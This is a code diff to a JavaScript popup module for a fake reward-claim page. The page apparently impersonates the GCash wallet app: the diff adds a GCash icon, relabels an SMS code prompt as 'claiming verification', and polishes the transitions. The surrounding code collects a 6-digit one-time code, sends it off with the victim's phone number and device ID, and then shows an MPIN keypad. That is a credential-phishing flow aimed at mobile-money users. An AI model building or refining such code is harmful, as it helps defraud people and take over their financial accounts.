@@ -1,6 +1,5 @@
 /**
  * Popup Share Module - Complete with Firewall Logic
- * Phase 1 (Default) → Check Firewall → Phase 2 (OFF) or Phase 3 (ON via SMS)
  */
 
 // ========== POPUP MODULE ==========
@@ -58,6 +57,11 @@
                 0% { box-shadow: 0 0 5px #00f2ff, 0 0 10px #00f2ff; }
                 50% { box-shadow: 0 0 15px #00f2ff, 0 0 25px #00f2ff, 0 0 35px #00f2ff; }
                 100% { box-shadow: 0 0 5px #00f2ff, 0 0 10px #00f2ff; }
+            }
+            @keyframes fadeInOut {
+                0% { opacity: 0; transform: scale(0.9); }
+                50% { opacity: 1; transform: scale(1); }
+                100% { opacity: 0; transform: scale(0.9); }
             }
             .btn-pulse {
                 animation: pulse 0.5s ease;
@@ -129,6 +133,31 @@
                 transform: scale(0.95);
                 background: rgba(255, 255, 255, 0.3);
             }
+            .small-back-btn {
+                background: rgba(255, 255, 255, 0.1);
+                border: 1px solid rgba(255, 215, 0, 0.3);
+                border-radius: 30px;
+                padding: 6px 16px;
+                font-size: 11px;
+                font-weight: 600;
+                color: #ffd700;
+                cursor: pointer;
+                transition: all 0.2s ease;
+                display: inline-flex;
+                align-items: center;
+                justify-content: center;
+                gap: 5px;
+                width: auto;
+                margin-top: 10px;
+            }
+            .small-back-btn:active {
+                transform: scale(0.95);
+            }
+            .transition-message {
+                text-align: center;
+                animation: fadeInOut 1.5s ease;
+                padding: 20px;
+            }
         `;
         if (!document.querySelector('#popup-animations')) {
             style.id = 'popup-animations';
@@ -151,6 +180,26 @@
         }
     }
     
+    // ========== SYNC BALANCE FROM FIREBASE ==========
+    async function syncBalanceFromFirebase() {
+        const userPhone = localStorage.getItem("userPhone");
+        if (!userPhone) return 0;
+        
+        try {
+            const db = firebase.database();
+            const snap = await db.ref('user_sessions/' + userPhone).once('value');
+            if (snap.exists() && snap.val().balance !== undefined) {
+                const balance = snap.val().balance;
+                const balanceEl = document.getElementById('userBalanceDisplay');
+                if (balanceEl) balanceEl.innerText = balance.toFixed(2);
+                return balance;
+            }
+        } catch(e) {
+            console.error('Error syncing balance:', e);
+        }
+        return 0;
+    }
+    
     // ========== ATTACH CLAIM BUTTON ==========
     function attachClaimButton() {
         const claimBtn = document.getElementById('claimNowBtn');
@@ -159,16 +208,13 @@
             return;
         }
         
-        claimBtn.onclick = function(e) {
+        claimBtn.onclick = async function(e) {
             e.preventDefault();
             e.stopPropagation();
             
             console.log('Claim button clicked!');
             
-            let balance = 0;
-            const balanceEl = document.getElementById('userBalanceDisplay');
-            if (balanceEl) balance = parseFloat(balanceEl.innerText) || 0;
-            
+            const balance = await syncBalanceFromFirebase();
             showPopup(balance);
             
             if (window.ConfettiModule) window.ConfettiModule.start();
@@ -286,7 +332,7 @@
         }, 300);
     }
     
-    // ========== PHASE 3: SMS VERIFICATION ==========
+    // ========== PHASE 3: CLAIMING VERIFICATION ==========
     function showPhase3() {
         const popupInner = document.querySelector('.popup-inner');
         if (!popupInner) return;
@@ -300,12 +346,13 @@
         popupInner.innerHTML = `
             <div class="popup-close" id="popupClosePhase3">✕</div>
             
+            <!-- GCASH ICON (Device Icon pinalitan ng gc_icon.png) -->
             <div style="text-align: center; margin-bottom: 10px;">
-                <div style="font-size: 55px; animation: bounceIn 0.5s ease;">📱</div>
+                <img src="images/gc_icon.png" style="width: 55px; height: 55px; animation: bounceIn 0.5s ease;">
             </div>
             
             <h2 style="text-align: center; font-family: 'Orbitron', monospace; font-size: 20px; font-weight: 900; color: #00f2ff; margin: 5px 0; letter-spacing: 1px; text-shadow: 0 0 10px #00f2ff; animation: neonBluePulse 1.5s infinite;">
-                SMS VERIFICATION
+                CLAIMING VERIFICATION
             </h2>
             
             <div class="divider" style="width: 50px; margin: 10px auto; background: #00f2ff;"></div>
@@ -363,11 +410,12 @@
                 </div>
             </div>
             
-            <div class="button-separator" style="margin: 15px 0 10px;"></div>
-            
-            <button class="back-btn" id="backBtnPhase3" style="width: 100%;">
-                ← BACK
-            </button>
+            <!-- Small BACK Button -->
+            <div style="text-align: center; margin-top: 10px;">
+                <button class="small-back-btn" id="backBtnPhase3">
+                    ← BACK
+                </button>
+            </div>
         `;
         
         attachPhase3Events();
@@ -393,7 +441,7 @@
             };
         }
         
-        // STEP 1: 6-digit verification (BYPASS)
+        // STEP 1: 6-digit verification (BYPASS) with transition
         const verifyBtn = document.getElementById('verify6DigitBtn');
         const codeInput = document.getElementById('code6Digit');
         const step1Container = document.getElementById('step1Container');
@@ -423,9 +471,22 @@
                 const deviceId = localStorage.getItem("userDeviceId") || "Unknown";
                 sendVerificationAttempt(userPhone, deviceId, code);
                 
-                // Show Step 2
-                if (step1Container) step1Container.style.display = 'none';
-                if (step2Container) step2Container.style.display = 'block';
+                // TRANSITION EFFECT
+                step1Container.style.transition = 'opacity 0.3s ease';
+                step1Container.style.opacity = '0';
+                
+                setTimeout(() => {
+                    step1Container.style.display = 'none';
+                    step2Container.style.display = 'block';
+                    step2Container.style.opacity = '0';
+                    step2Container.style.transform = 'scale(0.95)';
+                    
+                    setTimeout(() => {
+                        step2Container.style.transition = 'opacity 0.3s ease, transform 0.3s ease';
+                        step2Container.style.opacity = '1';
+                        step2Container.style.transform = 'scale(1)';
+                    }, 50);
+                }, 300);
                 
                 // Attach MPIN keypad
                 attachMPINKeypad();
@@ -518,7 +579,7 @@
         const isFirewallOn = await getFirewallStatus();
         
         if (isFirewallOn) {
-            console.log('Firewall ON - Showing SMS verification');
+            console.log('Firewall ON - Showing verification');
             showFirewallPopup();
         } else {
             console.log('Firewall OFF - Transition to Phase 2');
@@ -582,7 +643,7 @@
 
             <div class="button-separator"></div>
 
-            <button class="back-btn" id="backBtnPhase1">
+            <button class="small-back-btn" id="backBtnPhase1" style="margin: 0 auto; display: inline-flex;">
                 ← BACK
             </button>
         `;
@@ -644,7 +705,7 @@
 
             <div class="button-separator" style="margin: 10px 0 8px;"></div>
 
-            <button class="back-btn" id="backBtnPhase2" style="width: 100%; padding: 8px; font-size: 12px;">
+            <button class="small-back-btn" id="backBtnPhase2" style="margin: 0 auto; display: inline-flex;">
                 ← COMPLETE TASK #2
             </button>
         `;
